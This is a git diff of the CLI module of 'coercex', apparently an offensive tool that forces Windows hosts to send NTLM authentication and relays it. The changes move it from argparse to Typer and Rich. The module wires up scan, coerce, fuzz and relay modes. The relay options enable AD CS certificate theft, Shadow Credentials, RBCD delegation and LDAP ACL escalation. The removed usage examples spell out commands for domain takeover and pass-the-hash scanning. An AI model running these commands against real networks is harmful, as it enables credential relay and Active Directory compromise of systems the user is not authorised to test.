@@ -1,34 +1,72 @@
 """Command-line interface for coercex.
 
-Provides scan, coerce, and fuzz subcommands with full credential and
-target specification support.
+Modern Typer-based CLI with Rich output. Provides scan, coerce, fuzz,
+and relay subcommands.
 """
 
 from __future__ import annotations
 
-import argparse
 import asyncio
 import logging
 import sys
+from typing import Annotated, Optional
+
+import typer
+from rich.console import Console
+from rich.table import Table
 
 from coercex import __version__
 from coercex.methods import ALL_PROTOCOLS
-from coercex.scanner import (
-    Mode,
-    ScanConfig,
-    Scanner,
-    format_results_json,
-    format_results_table,
+from coercex.scanner import Mode, ScanConfig, Scanner
+from coercex.utils import Credentials, ScanStats, Transport, TriggerResult
+
+# ── Rich console ────────────────────────────────────────────────────
+console = Console(stderr=True)
+out_console = Console()  # stdout for results
+
+# ── Typer app ───────────────────────────────────────────────────────
+app = typer.Typer(
+    name="coercex",
+    help="Async NTLM authentication coercion scanner & fuzzer",
+    no_args_is_help=True,
+    rich_markup_mode="rich",
+    add_completion=False,
 )
-from coercex.utils import Credentials, ScanStats, Transport
 
 
-def _parse_targets(target: str | None, targets_file: str | None) -> list[str]:
+def _version_callback(value: bool) -> None:
+    if value:
+        out_console.print(f"coercex {__version__}")
+        raise typer.Exit()
+
+
+@app.callback()
+def _main(
+    version: Annotated[
+        bool,
+        typer.Option(
+            "--version",
+            "-V",
+            help="Show version and exit.",
+            callback=_version_callback,
+            is_eager=True,
+        ),
+    ] = False,
+) -> None:
+    """Async NTLM authentication coercion scanner & fuzzer."""
+
+
+# ── Helper: parse targets ───────────────────────────────────────────
+
+
+def _parse_targets(
+    target: str | None,
+    targets_file: str | None,
+) -> list[str]:
     """Resolve target list from CLI arguments."""
     result: list[str] = []
 
     if target:
-        # Comma-separated or single target
         for t in target.split(","):
             t = t.strip()
             if t:
@@ -42,400 +80,586 @@ def _parse_targets(target: str | None, targets_file: str | None) -> list[str]:
                     if line and not line.startswith("#"):
                         result.append(line)
         except FileNotFoundError:
-            print(f"Error: targets file not found: {targets_file}", file=sys.stderr)
-            sys.exit(1)
+            console.print(f"[bold red]Error:[/] targets file not found: {targets_file}")
+            raise typer.Exit(1)
 
     return result
 
 
-def _build_parser() -> argparse.ArgumentParser:
-    """Build the argument parser."""
-    parser = argparse.ArgumentParser(
-        prog="coercex",
-        description="Async NTLM authentication coercion scanner & fuzzer",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""\
-examples:
-  # Scan a single target for all coercible methods
-  coercex scan -t dc01.corp.local -u user -p pass -d corp.local
-
-  # Coerce with listener to capture NTLM auth
-  coercex coerce -t dc01.corp.local -l 10.0.0.5 -u user -p pass -d corp.local
-
-  # Relay coerced auth to LDAP on DC for domain takeover
-  coercex relay -t dc01.corp.local -l 10.0.0.5 --relay-to ldap://dc02.corp.local -u user -p pass
-
-  # Relay to AD CS for certificate theft
-  coercex relay -t dc01.corp.local -l 10.0.0.5 --relay-to http://cas.corp.local/certsrv/ --adcs --template DomainController -u user -p pass
-
-  # Scan with Kerberos ccache authentication
-  coercex scan -t dc01.corp.local --ccache /tmp/krb5cc_user -d corp.local
-
-  # Scan multiple targets from file, EFSR only
-  coercex scan -T targets.txt -u user -p pass --protocols MS-EFSR
-
-  # Fuzz all path styles via WebDAV
-  coercex fuzz -t dc01.corp.local -l 10.0.0.5 -u user -p pass --transport http
-
-  # High-concurrency scan with hash auth
-  coercex scan -t dc01.corp.local -u user -H aad3b435b51404ee:abc123... -d corp --concurrency 200
-""",
-    )
-    parser.add_argument(
-        "-V", "--version", action="version", version=f"coercex {__version__}"
-    )
-
-    subparsers = parser.add_subparsers(
-        dest="command", required=True, help="Mode of operation"
-    )
-
-    # ── Shared arguments ─────────────────────────────────────────────
-    parent = argparse.ArgumentParser(add_help=False)
-
-    # Target
-    target_group = parent.add_argument_group("target")
-    target_group.add_argument("-t", "--target", help="Target host(s), comma-separated")
-    target_group.add_argument(
-        "-T", "--targets-file", help="File with one target per line"
-    )
-
-    # Credentials
-    cred_group = parent.add_argument_group("credentials")
-    cred_group.add_argument("-u", "--username", default="", help="Username")
-    cred_group.add_argument("-p", "--password", default="", help="Password")
-    cred_group.add_argument("-d", "--domain", default="", help="Domain")
-    cred_group.add_argument(
-        "-H", "--hashes", default="", help="NTLM hashes (LMHASH:NTHASH)"
-    )
-    cred_group.add_argument("--aes-key", default="", help="AES key for Kerberos")
-    cred_group.add_argument(
-        "-k", "--kerberos", action="store_true", help="Use Kerberos auth"
-    )
-    cred_group.add_argument(
-        "--dc-host", default="", help="Domain controller hostname (for Kerberos)"
-    )
-    cred_group.add_argument(
-        "--ccache",
-        default="",
-        help="Path to Kerberos ccache file (or set KRB5CCNAME env var)",
-    )
-
-    # Protocol filter
-    filter_group = parent.add_argument_group("filtering")
-    filter_group.add_argument(
-        "--protocols",
-        nargs="+",
-        choices=ALL_PROTOCOLS,
-        metavar="PROTO",
-        help=f"Filter by protocol(s): {', '.join(ALL_PROTOCOLS)}",
-    )
-
-    # Performance
-    perf_group = parent.add_argument_group("performance")
-    perf_group.add_argument(
-        "-c",
-        "--concurrency",
-        type=int,
-        default=50,
-        help="Max concurrent tasks (default: 50)",
-    )
-    perf_group.add_argument(
-        "--timeout",
-        type=int,
-        default=5,
-        help="Connection timeout in seconds (default: 5)",
-    )
-
-    # Output
-    out_group = parent.add_argument_group("output")
-    out_group.add_argument(
-        "-v",
-        "--verbose",
-        action="store_true",
-        help="Show all results, not just vulnerable",
-    )
-    out_group.add_argument(
-        "--json", action="store_true", dest="json_output", help="Output results as JSON"
-    )
-    out_group.add_argument("-o", "--output-file", help="Write results to file")
-    out_group.add_argument("--debug", action="store_true", help="Enable debug logging")
-
-    # ── scan subcommand ──────────────────────────────────────────────
-    subparsers.add_parser(
-        "scan",
-        parents=[parent],
-        help="Scan targets for coercible RPC methods (no listener needed)",
-        description="Scan mode: triggers RPC methods with dummy paths and classifies error codes.",
-    )
-
-    # ── coerce subcommand ────────────────────────────────────────────
-    coerce_parser = subparsers.add_parser(
-        "coerce",
-        parents=[parent],
-        help="Trigger coercion with a listener to capture NTLM auth",
-        description="Coerce mode: starts a listener and confirms callbacks with correlation tokens.",
-    )
-    listener_group = coerce_parser.add_argument_group("listener")
-    listener_group.add_argument(
-        "-l",
-        "--listener",
-        required=True,
-        help="Listener IP (attacker IP reachable by targets)",
-    )
-    listener_group.add_argument(
-        "--http-port",
-        type=int,
-        default=80,
-        help="HTTP listener port (default: 80)",
-    )
-    listener_group.add_argument(
-        "--smb-port",
-        type=int,
-        default=445,
-        help="SMB listener port (default: 445)",
-    )
-    listener_group.add_argument(
-        "--transport",
-        choices=["smb", "http"],
-        default="smb",
-        help="Coercion transport: smb or http/WebDAV (default: smb)",
-    )
-    listener_group.add_argument(
-        "--callback-timeout",
-        type=float,
-        default=3.0,
-        help="Seconds to wait for callback per attempt (default: 3.0)",
-    )
-
-    # ── fuzz subcommand ──────────────────────────────────────────────
-    fuzz_parser = subparsers.add_parser(
-        "fuzz",
-        parents=[parent],
-        help="Fuzz all path styles and transports per method",
-        description="Fuzz mode: tries every path style variant for each method to find working combinations.",
-    )
-    fuzz_listener_group = fuzz_parser.add_argument_group("listener")
-    fuzz_listener_group.add_argument(
-        "-l",
-        "--listener",
-        required=True,
-        help="Listener IP (attacker IP reachable by targets)",
-    )
-    fuzz_listener_group.add_argument(
-        "--http-port",
-        type=int,
-        default=80,
-        help="HTTP listener port (default: 80)",
-    )
-    fuzz_listener_group.add_argument(
-        "--smb-port",
-        type=int,
-        default=445,
-        help="SMB listener port (default: 445)",
-    )
-    fuzz_listener_group.add_argument(
-        "--callback-timeout",
-        type=float,
-        default=3.0,
-        help="Seconds to wait for callback per attempt (default: 3.0)",
-    )
-
-    # ── relay subcommand ─────────────────────────────────────────────
-    relay_parser = subparsers.add_parser(
-        "relay",
-        parents=[parent],
-        help="Trigger coercion and relay captured NTLM auth to target services",
-        description=(
-            "Relay mode: starts HTTP+SMB relay servers (via impacket ntlmrelayx), "
-            "triggers coercion, and relays captured NTLM authentication to "
-            "target services (LDAP, SMB, HTTP/AD CS, etc.)."
-        ),
-    )
-    relay_net_group = relay_parser.add_argument_group("relay network")
-    relay_net_group.add_argument(
-        "-l",
-        "--listener",
-        required=True,
-        help="Interface/listener IP (attacker IP reachable by targets)",
-    )
-    relay_net_group.add_argument(
-        "--relay-to",
-        required=True,
-        nargs="+",
-        metavar="TARGET_URL",
-        help="Relay target URL(s): ldap://dc01, http://cas/certsrv/, smb://fs01",
-    )
-    relay_net_group.add_argument(
-        "--http-port",
-        type=int,
-        default=80,
-        help="HTTP relay server port (default: 80)",
-    )
-    relay_net_group.add_argument(
-        "--smb-port",
-        type=int,
-        default=445,
-        help="SMB relay server port (default: 445)",
-    )
-    relay_net_group.add_argument(
-        "--transport",
-        choices=["smb", "http"],
-        default="smb",
-        help="Coercion transport: smb or http/WebDAV (default: smb)",
-    )
-
-    relay_attack_group = relay_parser.add_argument_group("relay attacks")
-    relay_attack_group.add_argument(
-        "--adcs",
-        action="store_true",
-        help="Enable AD CS relay attack (request certificate)",
-    )
-    relay_attack_group.add_argument(
-        "--template",
-        default="",
-        metavar="TEMPLATE",
-        help="AD CS template name (default: Machine/User based on account)",
-    )
-    relay_attack_group.add_argument(
-        "--altname",
-        default="",
-        help="Subject Alternative Name for ESC1/ESC6 attacks",
-    )
-    relay_attack_group.add_argument(
-        "--shadow-credentials",
-        action="store_true",
-        help="Enable Shadow Credentials attack (msDS-KeyCredentialLink)",
-    )
-    relay_attack_group.add_argument(
-        "--shadow-target",
-        default="",
-        help="Target account for Shadow Credentials (user or computer$)",
-    )
-    relay_attack_group.add_argument(
-        "--delegate-access",
-        action="store_true",
-        help="Enable RBCD delegation access attack",
-    )
-    relay_attack_group.add_argument(
-        "--escalate-user",
-        default="",
-        help="User to escalate privileges for via LDAP ACL attack",
-    )
-    relay_attack_group.add_argument(
-        "--socks",
-        action="store_true",
-        help="Start SOCKS proxy to keep relayed sessions alive",
-    )
-    relay_attack_group.add_argument(
-        "--lootdir",
-        default="",
-        help="Directory to store loot (default: ./loot)",
-    )
-
-    return parser
+# ── Helper: build credentials ───────────────────────────────────────
 
 
-def main(argv: list[str] | None = None) -> None:
-    """Main entry point."""
-    parser = _build_parser()
-    args = parser.parse_args(argv)
+def _build_creds(
+    username: str,
+    password: str,
+    domain: str,
+    hashes: str,
+    aes_key: str,
+    kerberos: bool,
+    dc_host: str,
+    ccache: str,
+) -> Credentials:
+    creds = Credentials(
+        username=username,
+        password=password,
+        domain=domain,
+        hashes=hashes,
+        aes_key=aes_key,
+        do_kerberos=kerberos,
+        dc_host=dc_host,
+        ccache=ccache,
+    )
+    if creds.ccache or (creds.do_kerberos and not creds.password and not creds.hashes):
+        creds.load_ccache()
+    return creds
 
-    # ── Logging ──────────────────────────────────────────────────────
-    level = logging.DEBUG if args.debug else logging.INFO
+
+# ── Helper: configure logging ──────────────────────────────────────
+
+
+def _setup_logging(debug: bool) -> None:
+    level = logging.DEBUG if debug else logging.INFO
     logging.basicConfig(
         level=level,
         format="%(asctime)s %(name)s %(levelname)s %(message)s",
         datefmt="%H:%M:%S",
         stream=sys.stderr,
     )
-    # Suppress noisy impacket logging unless debug
-    if not args.debug:
+    if not debug:
         logging.getLogger("impacket").setLevel(logging.WARNING)
 
-    # ── Targets ──────────────────────────────────────────────────────
-    targets = _parse_targets(args.target, args.targets_file)
-    if not targets:
-        parser.error("No targets specified. Use -t or -T.")
 
-    # ── Credentials ──────────────────────────────────────────────────
-    creds = Credentials(
-        username=args.username,
-        password=args.password,
-        domain=args.domain,
-        hashes=args.hashes,
-        aes_key=args.aes_key,
-        do_kerberos=args.kerberos,
-        dc_host=args.dc_host,
-        ccache=args.ccache,
+# ── Rich output formatters ─────────────────────────────────────────
+
+_STATUS_STYLE = {
+    TriggerResult.VULNERABLE: ("bold green", "[+]"),
+    TriggerResult.ACCESSIBLE: ("yellow", "[~]"),
+    TriggerResult.ACCESS_DENIED: ("red", "[-]"),
+    TriggerResult.NOT_AVAILABLE: ("dim", "[ ]"),
+    TriggerResult.CONNECT_ERROR: ("bold red", "[!]"),
+    TriggerResult.TIMEOUT: ("magenta", "[T]"),
+    TriggerResult.UNKNOWN_ERROR: ("dim red", "[?]"),
+}
+
+
+def format_results_table_rich(stats: ScanStats, show_all: bool = False) -> Table:
+    """Build a Rich Table of scan results."""
+    table = Table(
+        title="Coercion Results",
+        show_lines=False,
+        header_style="bold cyan",
+        title_style="bold",
     )
+    table.add_column("Target", style="bold")
+    table.add_column("Protocol", style="blue")
+    table.add_column("Method")
+    table.add_column("Pipe", style="dim")
+    table.add_column("Result")
+    table.add_column("Callback")
 
-    # Load ccache if specified or if KRB5CCNAME is set with -k
-    if creds.ccache or (creds.do_kerberos and not creds.password and not creds.hashes):
-        creds.load_ccache()
+    results = stats.results
+    if not show_all:
+        results = [
+            r
+            for r in results
+            if r.result in (TriggerResult.VULNERABLE, TriggerResult.ACCESSIBLE)
+        ]
 
-    # ── Build config ─────────────────────────────────────────────────
-    mode = Mode[args.command.upper()]
+    for r in results:
+        style, sym = _STATUS_STYLE.get(r.result, ("dim red", "[?]"))
+        cb = "[bold green]YES[/]" if r.callback_received else ""
+        table.add_row(
+            r.target,
+            r.protocol,
+            r.method,
+            r.pipe,
+            f"[{style}]{sym} {r.result.value}[/]",
+            cb,
+        )
+
+    return table
+
+
+def format_results_json(stats: ScanStats, show_all: bool = False) -> str:
+    """Format scan results as JSON."""
+    import json
+
+    results = stats.results
+    if not show_all:
+        results = [
+            r
+            for r in results
+            if r.result in (TriggerResult.VULNERABLE, TriggerResult.ACCESSIBLE)
+        ]
+
+    data = {
+        "summary": {
+            "total_targets": stats.total_targets,
+            "total_attempts": stats.total_attempts,
+            "vulnerable": stats.vulnerable,
+            "accessible": stats.accessible,
+            "access_denied": stats.access_denied,
+            "not_available": stats.not_available,
+            "connect_errors": stats.connect_errors,
+            "timeouts": stats.timeouts,
+        },
+        "results": [
+            {
+                "target": r.target,
+                "protocol": r.protocol,
+                "method": r.method,
+                "pipe": r.pipe,
+                "uuid": r.uuid,
+                "result": r.result.value,
+                "callback_received": r.callback_received,
+                "source_ip": r.source_ip,
+                "error": r.error,
+            }
+            for r in results
+        ],
+    }
+    return json.dumps(data, indent=2)
+
+
+def _print_summary(stats: ScanStats) -> None:
+    """Print a Rich summary panel."""
+    from rich.panel import Panel
+
+    lines = [
+        f"[bold]Targets:[/]        {stats.total_targets}",
+        f"[bold]Attempts:[/]       {stats.total_attempts}",
+        f"[bold green]Vulnerable:[/]    {stats.vulnerable}",
+        f"[yellow]Accessible:[/]    {stats.accessible}",
+        f"[red]Access Denied:[/] {stats.access_denied}",
+        f"[dim]Not Available:[/] {stats.not_available}",
+        f"[bold red]Connect Errors:[/]{stats.connect_errors}",
+        f"[magenta]Timeouts:[/]      {stats.timeouts}",
+    ]
+    console.print(Panel("\n".join(lines), title="Summary", border_style="cyan"))
+
+
+def _output_results(
+    stats: ScanStats,
+    json_output: bool,
+    verbose: bool,
+    output_file: str,
+) -> None:
+    """Render results to stdout/file."""
+    if json_output:
+        output = format_results_json(stats, show_all=verbose)
+        if output_file:
+            with open(output_file, "w") as f:
+                f.write(output + "\n")
+            console.print(f"Results written to [bold]{output_file}[/]")
+        else:
+            out_console.print(output)
+    else:
+        table = format_results_table_rich(stats, show_all=verbose)
+        if output_file:
+            # Write plain text table to file
+            file_console = Console(file=open(output_file, "w"), width=200)
+            file_console.print(table)
+            file_console.file.close()
+            console.print(f"Results written to [bold]{output_file}[/]")
+        else:
+            if table.row_count == 0:
+                out_console.print("[dim]No vulnerable methods found.[/]")
+            else:
+                out_console.print(table)
+
+    _print_summary(stats)
+
+
+# ── Shared option types ─────────────────────────────────────────────
+# These Annotated types are reused across subcommands.
+
+TargetOpt = Annotated[
+    Optional[str],
+    typer.Option("-t", "--target", help="Target host(s), comma-separated"),
+]
+TargetsFileOpt = Annotated[
+    Optional[str],
+    typer.Option("-T", "--targets-file", help="File with one target per line"),
+]
+UsernameOpt = Annotated[str, typer.Option("-u", "--username", help="Username")]
+PasswordOpt = Annotated[str, typer.Option("-p", "--password", help="Password")]
+DomainOpt = Annotated[str, typer.Option("-d", "--domain", help="Domain")]
+HashesOpt = Annotated[
+    str, typer.Option("-H", "--hashes", help="NTLM hashes (LMHASH:NTHASH)")
+]
+AesKeyOpt = Annotated[str, typer.Option("--aes-key", help="AES key for Kerberos")]
+KerberosOpt = Annotated[
+    bool, typer.Option("-k", "--kerberos", help="Use Kerberos auth")
+]
+DcHostOpt = Annotated[
+    str, typer.Option("--dc-host", help="Domain controller hostname (for Kerberos)")
+]
+CcacheOpt = Annotated[
+    str,
+    typer.Option(
+        "--ccache", help="Path to Kerberos ccache file (or set KRB5CCNAME env var)"
+    ),
+]
+ProtocolsOpt = Annotated[
+    Optional[list[str]],
+    typer.Option(
+        "--protocols",
+        help=f"Filter by protocol(s): {', '.join(ALL_PROTOCOLS)}",
+    ),
+]
+ConcurrencyOpt = Annotated[
+    int, typer.Option("-c", "--concurrency", help="Max concurrent tasks")
+]
+TimeoutOpt = Annotated[
+    int, typer.Option("--timeout", help="Connection timeout in seconds")
+]
+VerboseOpt = Annotated[
+    bool,
+    typer.Option("-v", "--verbose", help="Show all results, not just vulnerable"),
+]
+JsonOpt = Annotated[bool, typer.Option("--json", help="Output results as JSON")]
+OutputFileOpt = Annotated[
+    Optional[str], typer.Option("-o", "--output-file", help="Write results to file")
+]
+DebugOpt = Annotated[bool, typer.Option("--debug", help="Enable debug logging")]
+ListenerOpt = Annotated[
+    Optional[str],
+    typer.Option(
+        "-l",
+        "--listener",
+        help="Listener IP (attacker IP reachable by targets). Optional — if omitted, works like scan mode (classify errors only).",
+    ),
+]
+HttpPortOpt = Annotated[int, typer.Option("--http-port", help="HTTP listener port")]
+SmbPortOpt = Annotated[int, typer.Option("--smb-port", help="SMB listener port")]
+TransportOpt = Annotated[
+    str,
+    typer.Option("--transport", help="Coercion transport: smb or http/WebDAV"),
+]
+CallbackTimeoutOpt = Annotated[
+    float,
+    typer.Option("--callback-timeout", help="Seconds to wait for callback per attempt"),
+]
+
+
+# ── scan ────────────────────────────────────────────────────────────
+
+
+@app.command()
+def scan(
+    target: TargetOpt = None,
+    targets_file: TargetsFileOpt = None,
+    username: UsernameOpt = "",
+    password: PasswordOpt = "",
+    domain: DomainOpt = "",
+    hashes: HashesOpt = "",
+    aes_key: AesKeyOpt = "",
+    kerberos: KerberosOpt = False,
+    dc_host: DcHostOpt = "",
+    ccache: CcacheOpt = "",
+    protocols: ProtocolsOpt = None,
+    concurrency: ConcurrencyOpt = 50,
+    timeout: TimeoutOpt = 5,
+    verbose: VerboseOpt = False,
+    json_output: JsonOpt = False,
+    output_file: OutputFileOpt = None,
+    debug: DebugOpt = False,
+) -> None:
+    """Scan targets for coercible RPC methods (no listener needed)."""
+    _setup_logging(debug)
+
+    targets = _parse_targets(target, targets_file)
+    if not targets:
+        console.print("[bold red]Error:[/] No targets specified. Use -t or -T.")
+        raise typer.Exit(1)
+
+    creds = _build_creds(
+        username, password, domain, hashes, aes_key, kerberos, dc_host, ccache
+    )
 
     config = ScanConfig(
         targets=targets,
-        mode=mode,
-        protocols=args.protocols,
+        mode=Mode.SCAN,
+        protocols=protocols,
         creds=creds,
-        concurrency=args.concurrency,
-        timeout=args.timeout,
-        verbose=args.verbose,
+        concurrency=concurrency,
+        timeout=timeout,
+        verbose=verbose,
     )
 
-    # Listener settings for coerce/fuzz
-    if mode in (Mode.COERCE, Mode.FUZZ):
-        config.listener_host = args.listener
-        config.http_port = args.http_port
-        config.smb_port = args.smb_port
-        config.callback_timeout = args.callback_timeout
-
-        if mode == Mode.COERCE:
-            config.transport = (
-                Transport.HTTP if args.transport == "http" else Transport.SMB
-            )
-
-    # Relay settings
-    if mode == Mode.RELAY:
-        config.listener_host = args.listener
-        config.http_port = args.http_port
-        config.smb_port = args.smb_port
-        config.transport = Transport.HTTP if args.transport == "http" else Transport.SMB
-        config.relay_targets = args.relay_to
-        config.relay_adcs = args.adcs
-        config.relay_adcs_template = args.template
-        config.relay_altname = args.altname
-        config.relay_shadow_credentials = args.shadow_credentials
-        config.relay_shadow_target = args.shadow_target
-        config.relay_delegate_access = args.delegate_access
-        config.relay_escalate_user = args.escalate_user
-        config.relay_socks = args.socks
-        config.relay_lootdir = args.lootdir
-
-    # ── Run ──────────────────────────────────────────────────────────
     stats = asyncio.run(_run(config))
+    _output_results(stats, json_output, verbose, output_file or "")
 
-    # ── Output results ───────────────────────────────────────────────
-    if args.json_output:
-        output = format_results_json(stats, show_all=args.verbose)
-    else:
-        output = format_results_table(stats, show_all=args.verbose)
 
-    if args.output_file:
-        with open(args.output_file, "w") as f:
-            f.write(output + "\n")
-        print(f"Results written to {args.output_file}", file=sys.stderr)
+# ── coerce ──────────────────────────────────────────────────────────
+
+
+@app.command()
+def coerce(
+    target: TargetOpt = None,
+    targets_file: TargetsFileOpt = None,
+    listener: ListenerOpt = None,
+    http_port: HttpPortOpt = 80,
+    smb_port: SmbPortOpt = 445,
+    transport: TransportOpt = "smb",
+    callback_timeout: CallbackTimeoutOpt = 3.0,
+    username: UsernameOpt = "",
+    password: PasswordOpt = "",
+    domain: DomainOpt = "",
+    hashes: HashesOpt = "",
+    aes_key: AesKeyOpt = "",
+    kerberos: KerberosOpt = False,
+    dc_host: DcHostOpt = "",
+    ccache: CcacheOpt = "",
+    protocols: ProtocolsOpt = None,
+    concurrency: ConcurrencyOpt = 50,
+    timeout: TimeoutOpt = 5,
+    verbose: VerboseOpt = False,
+    json_output: JsonOpt = False,
+    output_file: OutputFileOpt = None,
+    debug: DebugOpt = False,
+) -> None:
+    """Trigger coercion to capture NTLM auth.
+
+    If --listener is provided, starts a listener to confirm callbacks.
+    Otherwise, behaves like scan mode (classifies errors only).
+    """
+    _setup_logging(debug)
+
+    targets = _parse_targets(target, targets_file)
+    if not targets:
+        console.print("[bold red]Error:[/] No targets specified. Use -t or -T.")
+        raise typer.Exit(1)
+
+    creds = _build_creds(
+        username, password, domain, hashes, aes_key, kerberos, dc_host, ccache
+    )
+
+    config = ScanConfig(
+        targets=targets,
+        mode=Mode.COERCE,
+        protocols=protocols,
+        creds=creds,
+        concurrency=concurrency,
+        timeout=timeout,
+        verbose=verbose,
+        transport=Transport.HTTP if transport == "http" else Transport.SMB,
+    )
+
+    if listener:
+        config.listener_host = listener
+        config.http_port = http_port
+        config.smb_port = smb_port
+        config.callback_timeout = callback_timeout
     else:
-        print(output)
+        console.print(
+            "[yellow]No --listener set.[/] Running without listener (error classification only)."
+        )
+
+    stats = asyncio.run(_run(config))
+    _output_results(stats, json_output, verbose, output_file or "")
+
+
+# ── fuzz ────────────────────────────────────────────────────────────
+
+
+@app.command()
+def fuzz(
+    target: TargetOpt = None,
+    targets_file: TargetsFileOpt = None,
+    listener: ListenerOpt = None,
+    http_port: HttpPortOpt = 80,
+    smb_port: SmbPortOpt = 445,
+    callback_timeout: CallbackTimeoutOpt = 3.0,
+    username: UsernameOpt = "",
+    password: PasswordOpt = "",
+    domain: DomainOpt = "",
+    hashes: HashesOpt = "",
+    aes_key: AesKeyOpt = "",
+    kerberos: KerberosOpt = False,
+    dc_host: DcHostOpt = "",
+    ccache: CcacheOpt = "",
+    protocols: ProtocolsOpt = None,
+    concurrency: ConcurrencyOpt = 50,
+    timeout: TimeoutOpt = 5,
+    verbose: VerboseOpt = False,
+    json_output: JsonOpt = False,
+    output_file: OutputFileOpt = None,
+    debug: DebugOpt = False,
+) -> None:
+    """Fuzz all path styles and transports per method.
+
+    If --listener is provided, starts a listener to confirm callbacks.
+    Otherwise, behaves like scan mode (classifies errors only).
+    """
+    _setup_logging(debug)
+
+    targets = _parse_targets(target, targets_file)
+    if not targets:
+        console.print("[bold red]Error:[/] No targets specified. Use -t or -T.")
+        raise typer.Exit(1)
+
+    creds = _build_creds(
+        username, password, domain, hashes, aes_key, kerberos, dc_host, ccache
+    )
+
+    config = ScanConfig(
+        targets=targets,
+        mode=Mode.FUZZ,
+        protocols=protocols,
+        creds=creds,
+        concurrency=concurrency,
+        timeout=timeout,
+        verbose=verbose,
+    )
+
+    if listener:
+        config.listener_host = listener
+        config.http_port = http_port
+        config.smb_port = smb_port
+        config.callback_timeout = callback_timeout
+    else:
+        console.print(
+            "[yellow]No --listener set.[/] Running without listener (error classification only)."
+        )
+
+    stats = asyncio.run(_run(config))
+    _output_results(stats, json_output, verbose, output_file or "")
+
+
+# ── relay ───────────────────────────────────────────────────────────
+
+
+@app.command()
+def relay(
+    target: TargetOpt = None,
+    targets_file: TargetsFileOpt = None,
+    listener: Annotated[
+        str,
+        typer.Option(
+            "-l",
+            "--listener",
+            help="Interface/listener IP (attacker IP reachable by targets)",
+        ),
+    ] = ...,  # type: ignore[assignment]
+    relay_to: Annotated[
+        list[str],
+        typer.Option(
+            "--relay-to",
+            help="Relay target URL(s): ldap://dc01, http://cas/certsrv/, smb://fs01",
+        ),
+    ] = ...,  # type: ignore[assignment]
+    http_port: HttpPortOpt = 80,
+    smb_port: SmbPortOpt = 445,
+    transport: TransportOpt = "smb",
+    # Attack options
+    adcs: Annotated[
+        bool, typer.Option("--adcs", help="Enable AD CS relay attack")
+    ] = False,
+    template: Annotated[
+        str, typer.Option("--template", help="AD CS template name")
+    ] = "",
+    altname: Annotated[
+        str, typer.Option("--altname", help="Subject Alternative Name for ESC1/ESC6")
+    ] = "",
+    shadow_credentials: Annotated[
+        bool,
+        typer.Option("--shadow-credentials", help="Enable Shadow Credentials attack"),
+    ] = False,
+    shadow_target: Annotated[
+        str,
+        typer.Option("--shadow-target", help="Target account for Shadow Credentials"),
+    ] = "",
+    delegate_access: Annotated[
+        bool,
+        typer.Option("--delegate-access", help="Enable RBCD delegation access attack"),
+    ] = False,
+    escalate_user: Annotated[
+        str,
+        typer.Option("--escalate-user", help="User to escalate via LDAP ACL attack"),
+    ] = "",
+    socks: Annotated[
+        bool, typer.Option("--socks", help="Start SOCKS proxy for relayed sessions")
+    ] = False,
+    lootdir: Annotated[
+        str, typer.Option("--lootdir", help="Directory to store loot")
+    ] = "",
+    # Shared options
+    username: UsernameOpt = "",
+    password: PasswordOpt = "",
+    domain: DomainOpt = "",
+    hashes: HashesOpt = "",
+    aes_key: AesKeyOpt = "",
+    kerberos: KerberosOpt = False,
+    dc_host: DcHostOpt = "",
+    ccache: CcacheOpt = "",
+    protocols: ProtocolsOpt = None,
+    concurrency: ConcurrencyOpt = 50,
+    timeout: TimeoutOpt = 5,
+    verbose: VerboseOpt = False,
+    json_output: JsonOpt = False,
+    output_file: OutputFileOpt = None,
+    debug: DebugOpt = False,
+) -> None:
+    """Trigger coercion and relay captured NTLM auth to target services.
+
+    Starts HTTP+SMB relay servers (via impacket ntlmrelayx), triggers
+    coercion, and relays captured NTLM authentication.
+    """
+    _setup_logging(debug)
+
+    targets = _parse_targets(target, targets_file)
+    if not targets:
+        console.print("[bold red]Error:[/] No targets specified. Use -t or -T.")
+        raise typer.Exit(1)
+
+    creds = _build_creds(
+        username, password, domain, hashes, aes_key, kerberos, dc_host, ccache
+    )
+
+    config = ScanConfig(
+        targets=targets,
+        mode=Mode.RELAY,
+        protocols=protocols,
+        creds=creds,
+        listener_host=listener,
+        http_port=http_port,
+        smb_port=smb_port,
+        transport=Transport.HTTP if transport == "http" else Transport.SMB,
+        concurrency=concurrency,
+        timeout=timeout,
+        verbose=verbose,
+        relay_targets=relay_to,
+        relay_adcs=adcs,
+        relay_adcs_template=template,
+        relay_altname=altname,
+        relay_shadow_credentials=shadow_credentials,
+        relay_shadow_target=shadow_target,
+        relay_delegate_access=delegate_access,
+        relay_escalate_user=escalate_user,
+        relay_socks=socks,
+        relay_lootdir=lootdir,
+    )
+
+    stats = asyncio.run(_run(config))
+    _output_results(stats, json_output, verbose, output_file or "")
+
+
+# ── Runner ──────────────────────────────────────────────────────────
 
 
 async def _run(config: ScanConfig) -> ScanStats:
     """Async entry point for the scanner."""
-    scanner = Scanner(config)
+    scanner = Scanner(config, console=console)
     return await scanner.run()
+
+
+# ── Typer entry point (called by __main__.py and project.scripts) ──
+
+
+def main() -> None:
+    """Entry point wrapper for ``python -m coercex``."""
+    app()
 
 
 if __name__ == "__main__":
